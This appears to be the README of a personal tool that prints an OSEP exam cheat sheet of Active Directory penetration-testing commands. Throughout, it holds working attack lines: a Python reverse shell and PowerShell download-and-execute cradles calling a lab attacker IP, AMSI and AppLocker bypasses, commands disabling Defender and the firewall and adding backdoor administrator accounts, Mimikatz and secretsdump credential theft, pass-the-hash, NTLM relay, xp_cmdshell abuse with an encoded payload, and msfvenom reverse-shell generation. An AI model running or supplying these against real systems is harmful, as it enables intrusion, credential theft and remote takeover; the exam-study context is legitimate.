# osep-cheatgen

This is a tool which i created for my OSEP exam. It contains all important commands to help durring the penetration testing of Active directory.

## Usage

**To Clean**
```
┌──(root💀kali)-[/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator]
└─# ./cheat_gen.sh clean 
```

**To Genearte**
```
┌──(root💀kali)-[/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator]
└─# ./cheat_gen.sh > comamnds.txt
```

**Output**

```
################################################
    Online Tools
################################################
https://www.revshells.com/
https://raikia.com/tool-powershell-encoder/
https://www.jackson-t.ca/runtime-exec-payloads.html
https://lolbas-project.github.io/
https://gtfobins.github.io/
https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  (Kerberos)

# Color the text
tput setaf 3;cat commands.txt 
################################################
    Client side attack
################################################
sendemail -f attacker@email.com -t vactim@email.com -u attacker -m attackerpass -s x.x.x.x:25 -vvv -a resume.doc

###############
Fix the bugs
##############
Invoke-Command -ComputerName dc02 -ScriptBlock {ipconfig}

################################################
    Information Gathering
################################################
nmap -f -oG victim.com.nmap_quick victim.com
nmap --open -Pn -p - -sV -sC -T4 -oA victim.com.nmap_full --open victim.com
nmap -p0- -v -A -T4 -oA victim.com.nmap_full_aggresive 192.168.49.57

# Proof
hostname & type c:\Users\Administrator\Desktop\proof.txt   & ipconfig
# Windows
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"

# Linux
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "

###############################################
    tty shell Update
###############################################
python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl+z
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color

################################################
    Initial Shell (nc_port:446, python_port:4242) 
################################################

powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/nc.txt');"   
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.49.57,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
  
  
-------Meter_preter------------------
cmd.exe /c powershell wget http://192.168.49.57/Verified/new/payload.xml -O C:\ProgramData\payload.xml;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\payload.xml
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/bad.ps1') | IEX

----------Start Powershell------------------   
powershell.exe -nop -ep bypass

---Powershell_repal--------
curl -o powershell-repl.csproj http://192.168.49.57/Verified/xml/powershell-repl.csproj && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe powershell-repl.csproj
  


################################################
    Bypass_AV_AMSI_Constrained_MODE_APPLOCKER
################################################

----------Constrained_mode------------------
$ExecutionContext.SessionState.LanguageMode
wget http://10.10.14.105/Verified/bin/bypass-clm.exe -o C:\ProgramData\bypass-clm.exe --> exe not present.
                 
----------AMSI BYPASS--------------
powershell.exe -nop -ep bypass
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/amsi-bypass.txt') | IEX
    
----------Applocker Bypass-----------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\ProgramData\bypass-clm.exe 

---------Disable Antivirus------------
Set-Mppreference -disablerealtimemonitoring 1 

--------Disable Restricted_mode------
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0


###############################################
Privielge Escalation
###############################################
PrintSpoofer.exe -i -c cmd.exe



################################################
Weaponized tools.
################################################
  
curl -o ADCollector.exe  http://192.168.49.57/Verified/bin/ADCollector.exe
curl -o nmap.zip  http://192.168.49.57/Verified/nmap/nmap-7.92-win32.zip
curl -o Mimi_new.zip  http://192.168.49.57/Verified/compressedfile/Mimi_new.zip
curl -o npcap.exe http://192.168.49.57/Verified/nmap/npcap-1.60.exe
curl -o PsExec64.exe  http://192.168.49.57/Verified/bin/PsExec64.exe 
curl -o Rubeus.exe  http://192.168.49.57/Verified/bin/Rubeus.exe 
curl -o chisel.exe  http://192.168.49.57/Verified/bin/chisel.exe 
curl -o SharpUp.exe  http://192.168.49.57/Verified/bin/SharpUp.exe 
curl -o SpoolSample.exe  http://192.168.49.57/Verified/bin/SpoolSample.exe 
curl -o SharpHound.exe  http://192.168.49.57/Verified/bin/SharpHound.exe
curl -o DAFT.exe  http://192.168.49.57/Verified/SQLAUDIT/DAFT.exe 

v#TODO
curl -o SQLServerClient.exe  http://192.168.49.57/Verified/bin/SQLServerClient.exe 
curl -o PrintSpooferNet.exe  http://192.168.49.57/Verified/bin/PrintSpooferNet.exe 
curl -o katzimim.exe  http://192.168.49.57/Verified/bin/katzimim.exe 
curl -o MiniDump.exe  http://192.168.49.57/Verified/bin/MiniDump.exe 
curl -o HollowEvade.exe  http://192.168.49.57/Verified/bin/HollowEvade.exe 
curl -o FilelessLateralMovement.exe  http://192.168.49.57/Verified/bin/FilelessLateralMovement.exe 


(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/SharpHound.txt') | IEX; Invoke-BloodHound -CollectionMethod All
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/PowerUp.txt') | IEX; Invoke-AllChecks | Out-File -FilePath ~\powerup.txt
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/Invoke-Mimikatz.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/HostRecon.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/LAPSToolkit.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/PowerView.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/PowerUpSQL/PowerUpSQL.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/Powermad.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/powerviewv1.txt') | IEX

$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest 'http://192.168.49.57/Verified/bin/winPEASx64_ofs.exe' -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main('log')

$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest 'http://192.168.49.57/Verified/bin/Rubeus.exe' -UseBasicParsing | Select-Object -ExpandProperty Content)); [Rubeus.Program]::Main("dump".Split())

#TODO
Invoke-ShareFinder
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/ps/nice-function.txt') | IEX; Nice-Function -dd84f627e34042a19d0e69bbfb56125d $buf



################################################
Lateral_Moment_commands
################################################
psexec.py : 445
dcomexec.py : 135,445,(49751 dcom)
smbexec.py : 445
wmiexec.py : 135,445,(50911 winmgmt)
atexec.py : 445
crackmapexec 

Invoke-Command -ComputerName dc02.dev.final.com -ScriptBlock {type C:\Users\Administrator\Desktop\proof.txt}

evil-winrm -i 192.168.57.121 -u 'infinity\ted' -p 'ksecurity'
evil-winrm -i 192.168.57.121 -u 'infinity\ted' -H 'e929e69f7c290222be87968263a9282e'

######################
Enable RDP
######################
# Add User
net user evilme evilme /add
net localgroup "Administrators" evilme /add
net group ""Enterprise Admins"" offsec /add /domain
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

# Allow Remote Access
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f



%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe 
.\Rubeus.exe monitor /interval:1 /nowrap
.\PsExec.exe -i -s -d powershell
.\SpoolSample.exe dc02.dmzacbank.com appsrv09.dmzacbank.com


mimikat#
  privilege::debug
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords
  lsadump::dcsync /all /csv
  
  
#kekeo
 tgt::delgate
  
  
# Pass-The-Hash and or Restricted Admin login
// if you want to connect to RDP using mimikatz
sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"

// if you want to connect to target machine using mimikatz powershell
mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"

// if you want to connect to target machine using xfreedesktop
Enter-PSSession -Computer <Target>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress> 
xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verified,/path/to/Verified /timeout:60000


################################################
Blood-Hound Queries
################################################
Return all computers.
    MATCH (u:Computer)  return u.name

Return all nodes with outgoing permision.
    MATCH (n)-[r]->(g) where r.isacl = true return distinct(n.name)



####################################################################################
Attacking from Linux
####################################################################################

================
Turn of automatic date and time
================
timedatectl set-ntp 0
ntpdate 192.168.57.5


#############################
Crackmap
#############################
# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb --kdcHost 192.168.57.5  192.168.57.0/24 --gen-relay-list relay.txt 

# PSEXEC
crackmapexec smb  192.168.57.121   -d infinity -u 'ted' -H ':e929e69f7c290222be87968263a9282e' -x 'whoami'

# WINRM
crackmapexec winrm 192.168.57.121   -d infinity -u 'ted' -H 'e929e69f7c290222be87968263a9282e' -x 'whoami'

# Password_spray
proxychains4 -q  crackmapexec smb 172.16.57.0/24 -u 'Administrator' -d '.' -H '8388d07604009d14cbb78f7d37b9e887'

#############################
pywerview
#############################

#  Hint:
#  use --hashes if you dont have passwowrd.  )
#  usefull: get-netdomaintrust, get-netgroupmember, get-netshare, get-netfileserver, get-netsubnet

python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.infinity.com'  -p 'ksecurity'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.infinity.com'  -p 'ksecurity'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' -spn '*'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' | awk 'NF' > groupts.txt
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --groupname PswReaders
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'bolabola.com' -t 'dc03.bolabola.com'  -p 'ksecurity' --spn 


# Compare Groups with the default groups and find the difff
PATH : /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt
cat groupts.txt | anew /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt 



##########################
Convert Ticket to kerbi formate.
########################
# Hint: If TGT ticket is not working please try using kekeo to get ticket tgt::delgate (This solved the problem of null sessions)

cat /tmp/krb5cc_742201114_vjlDum |base64 -w 0
echo '======' | base64 -d > user.ccache
ticketConverter.py user.ccache user.kirbi
mimikataz#
kerberos::ptt user.kirbi
Enter-PSSession -ComputerName web01

---From windows to linux
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))


##########################################
IMPACKET
##########################################
# Hint: 
# replace -hashes with -k -no-pass (if kerberos) 
# IMPORTANT NOTE: DOMAIN NAME SHOULD NOT BE RETURN IN SINGLE QOUTE ELSE IT IS CASE SENSITIVE AND YOU WILL GET 
# USE /etc/resolve.conf  #Because kerberos is  bitch.

# PSEXEC (Pass the Hash)
impacket-psexec -hashes ":e929eds9f7c290222be87968263a9282d" "bolabola/ted"@192.168.57.121
impacket-psexec -no-pass -k  PROD.CORP1.COM/offsec@APPSRV01.PROD.CORP1.COM -dc-ip 192.168.57.70 

# WMIEXEC (Pass the Hash)
impacket-wmiexec -hashes ":e929e69f7c290222be87968263a9282e" "bolabola/ted"@192.168.57.121

# NTLMRELAYX (NTLMV2 RELAY)
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c 'whoami /all' -debug

# Convert Ticket to kerbi formate.
python ticket_converter.py ticket.kirbi ticket.ccache
kirbi2ccache ticket.kirbi wow.ccache
export KRB5CCNAME=<TGT_ccache_file>

# DCSYNC
impacket-secretsdump -just-dc  'bolabola/pete@192.168.57.120' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"

# Normal pc secrets dump
impacket-secretsdump   'bolabola/pete@192.168.57.121' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"

# Get user emails
impacket-GetADUsers -no-pass -k  bolabola.com/offsec -dc-ip 192.168.57.5 

# Kerberoasting / relay Attacks
impacket-GetUserSPNs -no-pass -k  bolabola.com/offsec -dc-ip 192.168.57.5  -outputfile lab1/output_tgs


# MSSQL CONNECT & SMB RELAY ATTACK
impacket-mssqlclient -no-pass  -k    bolabola.com/offsec@appsrv01.bolabola.com
impacket-mssqlclient -no-pass  -k    bolabola.com/offsec@dc01.bolabola.com


###########################################
#   MSSQL - Queries
##########################################
# https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs
# use db "master"

# Enumerate login info
SELECT SYSTEM_USER;

# Enumerate database username.
SELECT USER_NAME();

# Enumerate if user is member of Public or Sysadmin. If role is one then true.
SELECT IS_SRVROLEMEMBER('public');
SELECT IS_SRVROLEMEMBER('sysadmin');

# Force NTLM authentication for hash-grabbing or relaying
EXEC master..xp_dirtree "\192.168.49.67\share"
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c 'whoami /all' -debug

# Get logins that we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; 

# Impersonate login and get login information
EXECUTE AS LOGIN = 'sa';
use msdb; EXECUTE AS USER = 'dbo';

# Impersonate dbo in trusted database and execute through 'xp_cmdshell'
use msdb; EXECUTE AS USER = 'dbo';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Impersonate dbo in trusted database and execute through 'sp_OACreate' 
use msdb; EXECUTE AS USER = 'dbo';
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'whoami';

########
# Enumerate linked servers
########
EXEC sp_linkedservers;
Linked SQL server: DC01


#########
# Execute on linked server
#########
EXECUTE AS LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''whoami'';') AT SQL03;
EXEC ('xp_cmdshell ''powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANwAvAFYAZQByAGkAZgBpAGUAZAAvAHAAcwAvAG4AYwAuAHQAeAB0ACcAKQA7AA=='';') AT SQL03;

############
# Execute on linked server via 'openquery'
############
select version from openquery("dc01", 'select @@version as version')
select 1 from openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')
select 1 from openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')
select 1 from openquery("dc01", 'select 1; exec xp_cmdshell '"powershell whoami"')
select * from openquery("sql03",'exec master..xp_cmdshell "powershell whoami"')

############
# Escalate via double database linkedString
##############

# Enabling advanced options on appsrv01 using AT
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01

# Find the login on DC01
select mylogin from openquery("dc01", 'select SYSTEM_USER as mylogin');

#  Finding the login on APPSRV01 after following the links
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

select * from openquery("dc01", 'select * from openquery("appsrv01", ''select (SYSTEM_USER)'')')
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC (''xp_cmdshell ''''whoami /priv'''';'') AT appsrv01') AT dc01


##############################
Powerup SQL
##############################
# Find sql servers
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Audit the SQL instance
Invoke-SQLAudit -Verbose -Instance SQLServer1

# Privielge Esclate using powerupsql.
Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1

# Get linked servers.
Get-SQLServerLinkCrawl -Instance  web06

Executing Commands 
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'

Get-SQLQuery -Verbose -Instance "web06.dev.final.com" -Query "EXEC sp_serveroption 'SQL03', 'rpc out', 'true';" 
Get-SQLQuery -Verbose -Instance "web06.dev.final.com" -Query "EXEC sp_serveroption 'SQL03', 'rpc', 'true';"




##############################################
Cracking
#############################################

# Cracking Net NTLMv2 HASH
hashcat -m 5600 hash.txt dic.txt --force

# Cracking Kerberoasting, getuserspn, tgs files
hashcat -m 13100 --force <TGSs_file> <passwords_file>
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>

# Cracking ssh private key password.
/usr/share/john/ssh2john.py id_rsa.johny > sshhash.txt
john sshhash.txt --wordlist=/usr/share/wordlists/rockyou.txt


# Cracking Ansible
ansible2john test.yml
hashcat testhash.txt --force --hash-type=16900
cat pw.txt | ansible-vault decrypt


# Bcyrpt
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt




.........................................MSF CONSOLE...................................................


Paylaod Generator: reverse_https:raw
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.57 LPORT=443 -f raw StagerVerifySSLCert=true handlersslcert=/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/certificate_msfvenom.pem -o /mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/reverse_https.raw
Paylaod Generator: reverse_tcp:raw
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.57 LPORT=443 -f raw -o /mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/reverse_tcp.raw
```





